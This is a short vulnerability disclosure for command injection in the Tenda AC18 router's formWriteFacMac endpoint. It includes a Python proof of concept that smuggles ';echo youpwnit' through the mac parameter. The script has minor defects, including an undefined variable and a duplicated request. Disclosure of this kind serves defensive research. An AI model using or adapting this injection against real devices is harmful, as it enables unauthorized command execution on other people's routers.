A command execution vulnerability exists in Tenda AC18. The vulnerability arises from the application failing to properly filter construct commands, special characters, commands, etc. An attacker exploits the vulnerability to perform a command injection attack via the mac parameter of the formWriteFacMac method.

<img width="762" height="289" alt="image" src="https://github.com/user-attachments/assets/97cda6ba-7432-48bc-aa68-30ffd055df05" />


```
from pwn import *
import requests

url = "http://192.168.100.254/goform/WriteFacMac?mac=;echo youpwnit "

cookie = {"Cookie":"password=12345"}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
